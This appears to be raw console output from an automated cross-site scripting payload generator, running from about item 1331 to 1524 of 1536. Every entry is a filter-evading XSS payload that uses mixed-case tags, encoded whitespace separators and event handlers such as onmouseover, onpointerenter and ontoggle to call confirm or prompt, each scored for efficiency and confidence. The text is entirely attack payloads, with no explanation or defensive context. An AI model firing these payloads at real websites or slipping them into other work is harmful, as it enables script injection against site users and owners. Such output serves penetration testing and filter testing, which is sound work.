 Payload: <HTML/+/OnMouSeOvER%09=%09confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1331/1536 ------------------------------------------------------------
 Payload: <a%09onpoInTErENter%0d=%0d(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1332/1536 ------------------------------------------------------------
 Payload: <deTAIlS%0dOnPoINtEReNteR%09=%09confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1333/1536 ------------------------------------------------------------
 Payload: <Html%0aOnpOInTEReNter%0a=%0a(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1334/1536 ------------------------------------------------------------
 Payload: <hTmL%0aoNPoinTeREnTEr%0a=%0aa=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1335/1536 ------------------------------------------------------------
 Payload: <a%09oNPOInTEreNTer%0a=%0a(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1336/1536 ------------------------------------------------------------
 Payload: <A/+/onpoINTereNtEr+=+(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1337/1536 ------------------------------------------------------------
 Payload: <DetAiLS%0aonPoInTErENTeR%0a=%0aa=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1338/1536 ------------------------------------------------------------
 Payload: <dEtails/+/OnPoINTErEntEr+=+(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1339/1536 ------------------------------------------------------------
 Payload: <HtMl%0dOnPoINtERENtER%09=%09(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1340/1536 ------------------------------------------------------------
 Payload: <D3v%0aONMoUSeOvEr%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1341/1536 ------------------------------------------------------------
 Payload: <htMl/+/OnmOUSeOvER+=+(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1342/1536 ------------------------------------------------------------
 Payload: <d3V%0aOnpoiNTerenter%0d=%0d(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1343/1536  Progress: 1344/1536 ------------------------------------------------------------
 Payload: <A/+/OnPoiNTereNteR+=+confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1345/1536 ------------------------------------------------------------
 Payload: <HTML%09oNpOInTerentER%09=%09confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1346/1536 ------------------------------------------------------------
 Payload: <a%0aoNPoINteREnTEr%0d=%0d[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1347/1536 ------------------------------------------------------------
 Payload: <HTMl%09OnmouSEOVEr%0a=%0a[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1348/1536 ------------------------------------------------------------
 Payload: <HtmL%09onPOINtERentEr+=+confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1349/1536  Progress: 1350/1536 ------------------------------------------------------------
 Payload: <A%0dOnMoUSeOVER%0a=%0a(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1351/1536  Progress: 1352/1536 ------------------------------------------------------------
 Payload: <dEtAiLS%0aOnPoINtErENTeR%09=%09(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1353/1536 ------------------------------------------------------------
 Payload: <d3v%09oNMouSEOVeR+=+a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1354/1536 ------------------------------------------------------------
 Payload: <HtML%0doNpOIntERENTEr+=+(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1355/1536 ------------------------------------------------------------
 Payload: <Html%0dOnPOinTeRENteR%0a=%0aconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1356/1536 ------------------------------------------------------------
 Payload: <D3V/+/OnpoInTEreNteR%0d=%0dconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1357/1536  Progress: 1358/1536  Progress: 1359/1536 ------------------------------------------------------------
 Payload: <a%0dONPoInteREntEr%09=%09(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1360/1536 ------------------------------------------------------------
 Payload: <A%0dONmOusEOvER%0d=%0da=prompt,a()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1361/1536 ------------------------------------------------------------
 Payload: <a%09oNPoiNteREntER%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1362/1536 ------------------------------------------------------------
 Payload: <d3v%0aonPoiNtereNtEr%09=%09confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1363/1536 ------------------------------------------------------------
 Payload: <Html/+/OnPoInTeRENtER%0d=%0dconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1364/1536 ------------------------------------------------------------
 Payload: <HtMl%0dOnPOIntEreNter%0a=%0a[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1365/1536 ------------------------------------------------------------
 Payload: <d3V%0dOnpOInTERentEr%0d=%0d[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1366/1536 ------------------------------------------------------------
 Payload: <a%09onPoINteREnTEr%0d=%0d[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1367/1536 ------------------------------------------------------------
 Payload: <DeTaIlS%0aoNpoinTERenteR%0a=%0aconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1368/1536  Progress: 1369/1536  Progress: 1370/1536 ------------------------------------------------------------
 Payload: <A/+/OnPointEREnTer%0a=%0aa=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1371/1536 ------------------------------------------------------------
 Payload: <htML%09oNpointErentEr%09=%09(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1372/1536 ------------------------------------------------------------
 Payload: <HTml%0aOnPOinTereNTeR+=+a=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1373/1536 ------------------------------------------------------------
 Payload: <a/+/ONMoUSeoVEr+=+(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1374/1536 ------------------------------------------------------------
 Payload: <A%0aoNpointEreNtER%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1375/1536 ------------------------------------------------------------
 Payload: <D3v%0dONmoUsEoveR%0a=%0a(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1376/1536 ------------------------------------------------------------
 Payload: <d3V%09OnPOinTEREnter%0d=%0d[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1377/1536 ------------------------------------------------------------
 Payload: <HTMl%0dONpOiNTERENtER%0a=%0aconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1378/1536 ------------------------------------------------------------
 Payload: <a%0dONPOintErENtER%0d=%0d[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1379/1536 ------------------------------------------------------------
 Payload: <HtML/+/OnPOINtERenteR+=+confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1380/1536 ------------------------------------------------------------
 Payload: <hTml%0donpOIntErENtEr%09=%09confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1381/1536 ------------------------------------------------------------
 Payload: <D3v%0doNMouseoVEr%09=%09(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1382/1536 ------------------------------------------------------------
 Payload: <HTmL%0doNPoINtERentEr+=+confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1383/1536 ------------------------------------------------------------
 Payload: <HTml%09onpoiNtereNter%0d=%0d(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1384/1536 ------------------------------------------------------------
 Payload: <D3v/+/oNPoINTerEnTeR+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1385/1536 ------------------------------------------------------------
 Payload: <dEtAIlS/+/oNPoiNTerEnter%09=%09confirm()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1386/1536 ------------------------------------------------------------
 Payload: <A/+/oNmoUSeovER%09=%09(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1387/1536 ------------------------------------------------------------
 Payload: <HtmL/+/onPOinTeRenTER%09=%09(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1388/1536 ------------------------------------------------------------
 Payload: <a%0aONpointerENter%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1389/1536 ------------------------------------------------------------
 Payload: <a%0dOnPOintErEntER+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1390/1536 ------------------------------------------------------------
 Payload: <A%0dONPOINTEREnteR%0a=%0a[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1391/1536 ------------------------------------------------------------
 Payload: <details%0aonPoIntErENTEr%0d=%0dconfirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1392/1536 ------------------------------------------------------------
 Payload: <D3v%0dONMOuseOvEr%0a=%0a[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1393/1536 ------------------------------------------------------------
 Payload: <dEtaiLs%0aonPOINtEReNtER%0d=%0dconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1394/1536 ------------------------------------------------------------
 Payload: <d3v/+/onPoiNTereNTER+=+[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1395/1536 ------------------------------------------------------------
 Payload: <DETAiLs/+/oNTOggle%09=%09[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1396/1536 ------------------------------------------------------------
 Payload: <DEtAilS/+/oNPOINTeReNtER%0a=%0a[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1397/1536 ------------------------------------------------------------
 Payload: <deTaIlS%0dOnPoiNteRENTer+=+[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1398/1536 ------------------------------------------------------------
 Payload: <a%0aoNmOUsEoVEr%0d=%0d(confirm)()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1399/1536 ------------------------------------------------------------
 Payload: <HtMl%0aonMouSeoVEr%09=%09(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1400/1536 ------------------------------------------------------------
 Payload: <d3V%09onMoUSEover%09=%09[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1401/1536 ------------------------------------------------------------
 Payload: <HTML%09OnmouseOveR%09=%09[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1402/1536 ------------------------------------------------------------
 Payload: <d3V%09onpOintEREnTER%0d=%0dconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1403/1536 ------------------------------------------------------------
 Payload: <hTML%0doNpOINtERenTer+=+confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1404/1536  Progress: 1405/1536 ------------------------------------------------------------
 Payload: <a%09OnMOUSeOVer+=+(confirm)()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1406/1536 ------------------------------------------------------------
 Payload: <D3v%0doNMOusEOVER%0a=%0a[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1407/1536 ------------------------------------------------------------
 Payload: <DeTaIlS%0aONPoIntErenTEr%0d=%0d(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1408/1536 ------------------------------------------------------------
 Payload: <a/+/onmOuseoVEr+=+a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1409/1536 ------------------------------------------------------------
 Payload: <hTMl%0aONmOUSEOVer%0d=%0da=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1410/1536 ------------------------------------------------------------
 Payload: <d3v/+/onMoUseoVEr%0d=%0d(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1411/1536 ------------------------------------------------------------
 Payload: <htMl%0dOnMOUSEOVER%0d=%0d[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1412/1536 ------------------------------------------------------------
 Payload: <A%09ONMousEovEr%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1413/1536 ------------------------------------------------------------
 Payload: <A%0dOnMOUSEOver%09=%09(prompt)``%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1414/1536 ------------------------------------------------------------
 Payload: <dETaIls%0dOntOGgle%0a=%0a[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1415/1536  Progress: 1416/1536 ------------------------------------------------------------
 Payload: <D3V%0donPOiNtEREnTer%0d=%0d(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1417/1536 ------------------------------------------------------------
 Payload: <D3v%0doNMoUSEovEr%0d=%0da=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1418/1536  Progress: 1419/1536 ------------------------------------------------------------
 Payload: <html%0aonmOUseovEr%09=%09(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1420/1536 ------------------------------------------------------------
 Payload: <D3v%09onmoUsEover%0a=%0a[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1421/1536 ------------------------------------------------------------
 Payload: <a%0aOnMoUSeovER%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1422/1536 ------------------------------------------------------------
 Payload: <htMl%0doNPoInTEReNtER%0a=%0aa=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1423/1536 ------------------------------------------------------------
 Payload: <A%0donmOUseoVeR+=+confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1424/1536 ------------------------------------------------------------
 Payload: <D3v%0donPOINtERENter%09=%09[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1425/1536 ------------------------------------------------------------
 Payload: <a%09OnPOINTEreNTer+=+(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1426/1536 ------------------------------------------------------------
 Payload: <hTML%0aoNpOINtEReNTeR%09=%09confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1427/1536 ------------------------------------------------------------
 Payload: <a%09oNMoUSEOVEr+=+(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1428/1536 ------------------------------------------------------------
 Payload: <a%0donPoiNTErENTeR+=+[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1429/1536 ------------------------------------------------------------
 Payload: <htML%09onPointErEnTEr+=+(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1430/1536 ------------------------------------------------------------
 Payload: <A%09OnPOIntErENTER%09=%09(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1431/1536 ------------------------------------------------------------
 Payload: <A%0aOnmOUseoVeR+=+(prompt)``%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1432/1536 ------------------------------------------------------------
 Payload: <dETAilS%0dOnpOINTErENTEr%0a=%0a(confirm)()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1433/1536 ------------------------------------------------------------
 Payload: <a%0doNmOUSeOveR+=+(prompt)``%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1434/1536  Progress: 1435/1536 ------------------------------------------------------------
 Payload: <DEtAIlS%09OnPOiNTerEntER%0d=%0dconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1436/1536 ------------------------------------------------------------
 Payload: <d3v%09OnpOiNterEntER%09=%09[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1437/1536 ------------------------------------------------------------
 Payload: <a%0aoNMoUSeOVeR+=+a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1438/1536 ------------------------------------------------------------
 Payload: <detaILS%0aONpoINtereNteR%09=%09confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1439/1536  Progress: 1440/1536 ------------------------------------------------------------
 Payload: <detAilS%09onpoiNTErenTEr%0d=%0d[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1441/1536 ------------------------------------------------------------
 Payload: <D3v/+/ONmouSEOVeR+=+(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1442/1536 ------------------------------------------------------------
 Payload: <a%0aONpOINTEreNter%0d=%0da=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1443/1536 ------------------------------------------------------------
 Payload: <d3V%09ONPoinTerENTeR+=+(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1444/1536 ------------------------------------------------------------
 Payload: <a%0aOnpoINTeReNTer%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1445/1536 ------------------------------------------------------------
 Payload: <D3v/+/OnpOInTERenTER%09=%09a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1446/1536  Progress: 1447/1536 ------------------------------------------------------------
 Payload: <deTAILs%0aoNpoiNtERENTeR%0d=%0d(confirm)()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1448/1536 ------------------------------------------------------------
 Payload: <a%0dONMOuseoveR+=+a=prompt,a()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1449/1536 ------------------------------------------------------------
 Payload: <A/+/ONpoinTeReNtEr+=+(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1450/1536 ------------------------------------------------------------
 Payload: <D3v/+/ONpoiNtErENtEr%0a=%0a(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1451/1536 ------------------------------------------------------------
 Payload: <D3V/+/onMOusEOvEr%09=%09[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1452/1536 ------------------------------------------------------------
 Payload: <D3v%0donMouSeOvEr+=+(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1453/1536 ------------------------------------------------------------
 Payload: <a/+/OnPOINtEREnTeR%0d=%0d(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1454/1536 ------------------------------------------------------------
 Payload: <D3V%0aOnmOUsEOvEr%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1455/1536 ------------------------------------------------------------
 Payload: <DetaIls%0aoNPointErEnTer%0d=%0da=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1456/1536 ------------------------------------------------------------
 Payload: <dETAIlS/+/ONTogglE+=+a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1457/1536  Progress: 1458/1536 ------------------------------------------------------------
 Payload: <DetAIlS%0dontOGgle+=+[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1459/1536 ------------------------------------------------------------
 Payload: <Html%0donMOuSEOVer%09=%09[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1460/1536 ------------------------------------------------------------
 Payload: <a/+/onMOuseoVEr+=+(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1461/1536 ------------------------------------------------------------
 Payload: <a%09oNPOinTeREntEr%0a=%0aa=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1462/1536 ------------------------------------------------------------
 Payload: <A%09ONMoUSEoveR%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1463/1536  Progress: 1464/1536 ------------------------------------------------------------
 Payload: <detaIls%09oNTOgGLe+=+(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1465/1536  Progress: 1466/1536  Progress: 1467/1536 ------------------------------------------------------------
 Payload: <a%0doNPoiNTeRENter%0d=%0d(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1468/1536 ------------------------------------------------------------
 Payload: <hTMl/+/onpoIntEreNter%09=%09(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1469/1536 ------------------------------------------------------------
 Payload: <D3V%0aOnmoUSeoVEr%09=%09(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1470/1536 ------------------------------------------------------------
 Payload: <DeTAILS%0donPoInterEntER%0d=%0d(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1471/1536 ------------------------------------------------------------
 Payload: <d3v%0aONpoinTErEnter+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1472/1536 ------------------------------------------------------------
 Payload: <d3v/+/onpoinTeREnTER%0a=%0a(confirm)()%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1473/1536 ------------------------------------------------------------
 Payload: <d3V%0doNMouSeOvER%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1474/1536 ------------------------------------------------------------
 Payload: <A%09OnmoUsEoVeR%0d=%0d(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1475/1536 ------------------------------------------------------------
 Payload: <a%0donmouSeOver+=+[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1476/1536 ------------------------------------------------------------
 Payload: <detAilS/+/oNPOINterEnTer%09=%09(confirm)()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1477/1536 ------------------------------------------------------------
 Payload: <A%0donPoInTerenteR%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1478/1536 ------------------------------------------------------------
 Payload: <D3v%09ONpoIntErENtEr%0a=%0a(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1479/1536 ------------------------------------------------------------
 Payload: <a%0aONmOUseOvEr+=+a=prompt,a()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1480/1536 ------------------------------------------------------------
 Payload: <D3v/+/ONMoUsEOVER%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1481/1536 ------------------------------------------------------------
 Payload: <HtML/+/OnpOinTErENTeR%0d=%0d(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1482/1536 ------------------------------------------------------------
 Payload: <a%0aONmousEoVeR%0d=%0d(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1483/1536  Progress: 1484/1536 ------------------------------------------------------------
 Payload: <deTaILs%0aoNTogGle+=+a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1485/1536 ------------------------------------------------------------
 Payload: <a%0donpOInTEReNter%09=%09a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1486/1536 ------------------------------------------------------------
 Payload: <d3V%09ONPointEreNTEr+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1487/1536  Progress: 1488/1536 ------------------------------------------------------------
 Payload: <dETaILs/+/onPOintErEnTEr+=+confirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1489/1536 ------------------------------------------------------------
 Payload: <d3V/+/oNmoUSEovEr%0d=%0d(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1490/1536 ------------------------------------------------------------
 Payload: <D3v/+/ONPOINTEReNtER%0a=%0aconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1491/1536  Progress: 1492/1536  Progress: 1493/1536 ------------------------------------------------------------
 Payload: <DEtaiLs/+/ONtoGGLe+=+(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1494/1536 ------------------------------------------------------------
 Payload: <a%0dOnmOusEOveR%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1495/1536 ------------------------------------------------------------
 Payload: <DetAIls%0donpoInTErentEr%0a=%0a[8].find(confirm)// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1496/1536 ------------------------------------------------------------
 Payload: <Html/+/OnPOInterENTER+=+(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1497/1536 ------------------------------------------------------------
 Payload: <htML%09OnmoUsEOvEr%09=%09[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1498/1536 ------------------------------------------------------------
 Payload: <a/+/OnmOuseoVEr%0a=%0a(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1499/1536 ------------------------------------------------------------
 Payload: <a%0dOnPOintErENTER%0d=%0d(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1500/1536 ------------------------------------------------------------
 Payload: <d3v%09oNPOINTerENteR%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1501/1536 ------------------------------------------------------------
 Payload: <hTML%0donPOInteReNter%0d=%0dconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1502/1536  Progress: 1503/1536 ------------------------------------------------------------
 Payload: <a%0aoNMOuSEovEr+=+(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1504/1536 ------------------------------------------------------------
 Payload: <HtMl%09ONpoinTerENter%0d=%0d[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1505/1536 ------------------------------------------------------------
 Payload: <a/+/oNMOUsEOVER%09=%09(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1506/1536 ------------------------------------------------------------
 Payload: <D3v%09onmouSEoVer%0a=%0a(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1507/1536  Progress: 1508/1536  Progress: 1509/1536 ------------------------------------------------------------
 Payload: <hTML%09onmOusEOveR%09=%09(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1510/1536 ------------------------------------------------------------
 Payload: <HtMl%0dOnPoIntERentEr%0a=%0a[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1511/1536 ------------------------------------------------------------
 Payload: <A%0aoNPoinTerenTer%0d=%0d(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1512/1536 ------------------------------------------------------------
 Payload: <HTml%0aONmOUSeover%0d=%0d(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1513/1536 ------------------------------------------------------------
 Payload: <A%0aONmouSeOVEr%0a=%0a[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1514/1536 ------------------------------------------------------------
 Payload: <a%0donpoinTeRenTER%0a=%0aa=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1515/1536 ------------------------------------------------------------
 Payload: <d3V%09OnMOUSEOvEr%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1516/1536 ------------------------------------------------------------
 Payload: <a%09OnpOinTERentEr%0d=%0d[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1517/1536 ------------------------------------------------------------
 Payload: <hTML/+/onPOINtERenTEr+=+a=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1518/1536 ------------------------------------------------------------
 Payload: <html%09ONmousEOVer%0a=%0aa=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1519/1536 ------------------------------------------------------------
 Payload: <DEtAIlS/+/ONtoggle+=+[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1520/1536 ------------------------------------------------------------
 Payload: <Html%09onPoIntERENtEr%09=%09(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1521/1536 ------------------------------------------------------------
 Payload: <hTMl%0aoNmouseOvEr%09=%09[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1522/1536 ------------------------------------------------------------
 Payload: <a%0aONPOiNtereNter%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1523/1536 ------------------------------------------------------------
 Payload: <D3V%0donPOinTERENteR%0a=%0aconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1524/1536 ------------------------------------------------------------
 Payload: <A%09ONpoINteRenteR+=+(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
